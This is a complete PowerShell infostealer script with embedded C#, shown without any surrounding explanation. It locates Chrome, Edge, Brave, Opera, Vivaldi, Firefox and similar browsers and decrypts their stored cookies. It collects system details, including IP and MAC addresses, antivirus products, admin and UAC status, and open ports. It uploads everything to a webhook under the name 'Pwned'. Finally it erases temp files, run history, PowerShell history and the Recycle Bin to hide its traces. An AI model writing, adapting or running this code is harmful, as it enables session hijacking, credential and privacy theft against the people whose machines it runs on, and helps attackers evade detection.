$w="$dc"
Add-Type -AN System.Security
Add-Type @"
using System;using System.Runtime.InteropServices;using System.Text;
public class G{
[DllImport("bcrypt.dll")]static extern int BCryptOpenAlgorithmProvider(out IntPtr a,string b,string c,int d);
[DllImport("bcrypt.dll")]static extern int BCryptCloseAlgorithmProvider(IntPtr a,int b);
[DllImport("bcrypt.dll")]static extern int BCryptSetProperty(IntPtr a,string b,byte[] c,int d,int e);
[DllImport("bcrypt.dll")]static extern int BCryptGenerateSymmetricKey(IntPtr a,out IntPtr b,IntPtr c,int d,byte[] e,int f,int g);
[DllImport("bcrypt.dll")]static extern int BCryptDestroyKey(IntPtr a);
[DllImport("bcrypt.dll")]static extern int BCryptDecrypt(IntPtr a,byte[] b,int c,ref AI d,byte[] e,int f,byte[] g,int h,out int i,int j);
[StructLayout(LayoutKind.Sequential)]public struct AI{public int s;public int v;public IntPtr pN;public int cN;public IntPtr pA;public int cA;public IntPtr pT;public int cT;public IntPtr pM;public int cM;public int cAA;public long cD;public int f;}
public static string D(byte[] k,byte[] n,byte[] ct,byte[] t){IntPtr hA,hK;BCryptOpenAlgorithmProvider(out hA,"AES",null,0);var m=Encoding.Unicode.GetBytes("ChainingModeGCM");BCryptSetProperty(hA,"ChainingMode",m,m.Length,0);BCryptGenerateSymmetricKey(hA,out hK,IntPtr.Zero,0,k,k.Length,0);var ai=new AI();ai.s=Marshal.SizeOf(ai);ai.v=1;var nP=GCHandle.Alloc(n,GCHandleType.Pinned);var tP=GCHandle.Alloc(t,GCHandleType.Pinned);ai.pN=nP.AddrOfPinnedObject();ai.cN=n.Length;ai.pT=tP.AddrOfPinnedObject();ai.cT=t.Length;var pt=new byte[ct.Length];int r;BCryptDecrypt(hK,ct,ct.Length,ref ai,null,0,pt,pt.Length,out r,0);nP.Free();tP.Free();BCryptDestroyKey(hK);BCryptCloseAlgorithmProvider(hA,0);return Encoding.UTF8.GetString(pt,0,r);}
[DllImport("winsqlite3.dll",EntryPoint="sqlite3_open")]public static extern int Open(string f,out IntPtr db);
[DllImport("winsqlite3.dll",EntryPoint="sqlite3_prepare_v2")]public static extern int Prep(IntPtr db,string s,int n,out IntPtr st,IntPtr t);
[DllImport("winsqlite3.dll",EntryPoint="sqlite3_step")]public static extern int Step(IntPtr st);
[DllImport("winsqlite3.dll",EntryPoint="sqlite3_column_text")]static extern IntPtr ColTxt(IntPtr st,int i);
[DllImport("winsqlite3.dll",EntryPoint="sqlite3_column_bytes")]static extern int ColLen(IntPtr st,int i);
[DllImport("winsqlite3.dll",EntryPoint="sqlite3_column_blob")]static extern IntPtr ColBlob(IntPtr st,int i);
[DllImport("winsqlite3.dll",EntryPoint="sqlite3_finalize")]public static extern int Fin(IntPtr st);
[DllImport("winsqlite3.dll",EntryPoint="sqlite3_close")]public static extern int Close(IntPtr db);
public static string CT(IntPtr st,int i){IntPtr p=ColTxt(st,i);return p==IntPtr.Zero?null:Marshal.PtrToStringAnsi(p);}
public static byte[] CB(IntPtr st,int i){int l=ColLen(st,i);if(l<=0)return new byte[0];IntPtr p=ColBlob(st,i);var b=new byte[l];Marshal.Copy(p,b,0,l);return b;}
}
"@
$hd=@{'Content-Type'='application/json'};$l=$env:LOCALAPPDATA;$a=$env:APPDATA
function DK($d){$f="$d\Local State";if(!(Test-Path $f)){return $null};$k=(gc $f -Raw|ConvertFrom-Json).os_crypt.encrypted_key;if(!$k){return $null};$b=[Convert]::FromBase64String($k);[Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)],$null,'CurrentUser')}
$chromium=@{Chrome="$l\Google\Chrome\User Data";Edge="$l\Microsoft\Edge\User Data";Brave="$l\BraveSoftware\Brave-Browser\User Data";Opera="$a\Opera Software\Opera Stable";"Opera GX"="$a\Opera Software\Opera GX Stable";Vivaldi="$l\Vivaldi\User Data"}
$firefox=@{Firefox="$a\Mozilla\Firefox\Profiles";Waterfox="$a\Waterfox\Profiles";LibreWolf="$a\librewolf\Profiles";"Pale Moon"="$a\Moonchild Productions\Pale Moon\Profiles";Zen="$a\zen\Profiles"}
$detCr=@{};$chromium.GetEnumerator()|%{if(Test-Path $_.Value){$detCr[$_.Key]=$_.Value}};$detFx=@{};$firefox.GetEnumerator()|%{if(Test-Path $_.Value){$detFx[$_.Key]=$_.Value}}
$scanTxt=@();$detCr.GetEnumerator()|Sort Name|%{$scanTxt+="[Chromium] $($_.Key)"};$detFx.GetEnumerator()|Sort Name|%{$scanTxt+="[Firefox] $($_.Key)"}
$brTxt=if($scanTxt.Count-gt 0){($scanTxt|%{"``$_``"})-join"`n"}else{"None"}
$i=try{irm "https://ipwho.is/"}catch{$null};$ip=if($i){$i.ip}else{"?"}
$os=(gcim Win32_OperatingSystem);$bld="$($os.Caption) ($($os.BuildNumber))"
$adm=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')
$uac=(gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -EA 0).EnableLUA
$av=(gcim -Namespace root/SecurityCenter2 -Class AntiVirusProduct -EA 0).displayName-join", "
$mac=(Get-NetAdapter -Physical -EA 0|?{$_.Status-eq'Up'}|Select -First 1).MacAddress
$lip=(Get-NetIPAddress -AddressFamily IPv4 -EA 0|?{$_.IPAddress-ne'127.0.0.1'}|Select -First 1).IPAddress
$op=try{(Get-NetTCPConnection -State Listen -EA 0|Select -Exp LocalPort -Unique|Sort|Select -First 25)-join", "}catch{"?"}
$allCk=@{};$ckSum=@{}
foreach($br in $detCr.GetEnumerator()){$bd=$br.Value;$dk=DK $bd;if(!$dk){continue}
$cfs=@();gci "$bd" -R -Filter "Cookies" -File -EA 0|?{$_.Directory.Name-eq'Default'-or$_.Directory.Name-eq'Network'-or$_.Directory.Name-match'^Profile'}|Select -First 8|%{$cfs+=$_}
if($cfs.Count-eq 0){gci "$bd" -R -Filter "Cookies" -File -EA 0|Select -First 3|%{$cfs+=$_}}
$bCk=@();foreach($cf in $cfs){try{$tmp="$env:TEMP\ck_$(Get-Random).db";Copy-Item $cf.FullName $tmp -Force
$db=[IntPtr]::Zero;$st=[IntPtr]::Zero;$rc=[G]::Open($tmp,[ref]$db)
if($rc-eq 0){$sql="SELECT host_key,name,encrypted_value,path FROM cookies";$rc2=[G]::Prep($db,$sql,$sql.Length,[ref]$st,[IntPtr]::Zero)
if($rc2-eq 0){while(([G]::Step($st))-eq 100){$hk=[G]::CT($st,0);$nm=[G]::CT($st,1);$enc=[G]::CB($st,2);$pt=[G]::CT($st,3);$val=""
if($enc.Length-gt 15-and$enc[0]-eq 118-and$enc[1]-eq49-and$enc[2]-eq48){try{$n=$enc[3..14];$ct=$enc[15..($enc.Length-17)];$tg=$enc[($enc.Length-16)..($enc.Length-1)];$val=[G]::D($dk,$n,$ct,$tg)}catch{}}
elseif($enc.Length-gt 0){try{$val=[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser'))}catch{}}
if($val){$bCk+=@{domain=$hk;name=$nm;value=$val;path=$pt}}};[void][G]::Fin($st)};[void][G]::Close($db)};Remove-Item $tmp -Force -EA 0}catch{if(Test-Path $tmp){Remove-Item $tmp -Force -EA 0}}}
if($bCk.Count-gt 0){$allCk[$br.Key]=$bCk;$ckSum[$br.Key]=$bCk.Count}}
foreach($br in $detFx.GetEnumerator()){$profRoot=$br.Value;$profiles=gci $profRoot -Directory -EA 0;$bCk=@()
foreach($prof in $profiles){$ckFile="$($prof.FullName)\cookies.sqlite";if(!(Test-Path $ckFile)){continue}
try{$tmp="$env:TEMP\fxck_$(Get-Random).db";Copy-Item $ckFile $tmp -Force
$db=[IntPtr]::Zero;$st=[IntPtr]::Zero;$rc=[G]::Open($tmp,[ref]$db)
if($rc-eq 0){$sql="SELECT host,name,value,path FROM moz_cookies";$rc2=[G]::Prep($db,$sql,$sql.Length,[ref]$st,[IntPtr]::Zero)
if($rc2-eq 0){while(([G]::Step($st))-eq 100){$hk=[G]::CT($st,0);$nm=[G]::CT($st,1);$val=[G]::CT($st,2);$pt=[G]::CT($st,3)
if($val){$bCk+=@{domain=$hk;name=$nm;value=$val;path=$pt}}};[void][G]::Fin($st)};[void][G]::Close($db)};Remove-Item $tmp -Force -EA 0}catch{if(Test-Path $tmp){Remove-Item $tmp -Force -EA 0}}}
if($bCk.Count-gt 0){$allCk[$br.Key]=$bCk;$ckSum[$br.Key]=$bCk.Count}}
$em=@();$em+=@{title="$env:USERNAME@$env:COMPUTERNAME";color=16711680;fields=@(@{name="OS";value="``$bld``";inline=$true},@{name="Admin";value="``$adm``";inline=$true},@{name="UAC";value="``$(if($uac){'On'}else{'Off'})``";inline=$true},@{name="Ext IP";value="``$ip``";inline=$true},@{name="Int IP";value="``$lip``";inline=$true},@{name="MAC";value="``$mac``";inline=$true},@{name="AV";value="``$(if($av){$av}else{'None'})``";inline=$true},@{name="Ports";value="``$op``";inline=$false},@{name="Browsers Found";value=$brTxt;inline=$false})}
$sumTxt=if($ckSum.Count-gt 0){($ckSum.GetEnumerator()|Sort Name|%{"**$($_.Key)**: $($_.Value) cookies"})-join"`n"}else{"No cookies found"}
$totalCk=($ckSum.Values|Measure-Object -Sum).Sum;$em+=@{title="Browser Cookies ($totalCk total)";color=15105570;description=$sumTxt;footer=@{text="$(Get-Date -F 'yyyy-MM-dd HH:mm:ss')"}}
$j=@{embeds=$em;username="Pwned"}|ConvertTo-Json -De 10 -Compress;iwr $w -Method POST -Body([Text.Encoding]::UTF8.GetBytes($j)) -Headers $hd -UseBasicParsing|Out-Null
foreach($br in $allCk.GetEnumerator()){$fn="$env:TEMP\$($br.Key)_cookies.json";$br.Value|%{[PSCustomObject]$_}|ConvertTo-Json -De 5|Out-File $fn -Encoding UTF8 -Force
$boundary="----$(Get-Random)";$nl="`r`n";$body=[Text.Encoding]::UTF8.GetBytes("--$boundary${nl}Content-Disposition: form-data; name=`"payload_json`"${nl}Content-Type: application/json${nl}${nl}$(@{username='Pwned';content="Cookies: **$($br.Key)** ($($br.Value.Count))"}|ConvertTo-Json -Compress)${nl}--$boundary${nl}Content-Disposition: form-data; name=`"file`"; filename=`"$($br.Key)_cookies.json`"${nl}Content-Type: application/json${nl}${nl}")
$fileBytes=[IO.File]::ReadAllBytes($fn);$end=[Text.Encoding]::UTF8.GetBytes("${nl}--$boundary--${nl}");$full=[byte[]]::new($body.Length+$fileBytes.Length+$end.Length)
[Buffer]::BlockCopy($body,0,$full,0,$body.Length);[Buffer]::BlockCopy($fileBytes,0,$full,$body.Length,$fileBytes.Length);[Buffer]::BlockCopy($end,0,$full,$body.Length+$fileBytes.Length,$end.Length)
iwr $w -Method POST -Body $full -Headers @{'Content-Type'="multipart/form-data; boundary=$boundary"} -UseBasicParsing|Out-Null;Remove-Item $fn -Force -EA 0}
rm $env:TEMP\* -r -Force -EA 0;reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f 2>$null;Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA 0;Clear-RecycleBin -Force -EA 0
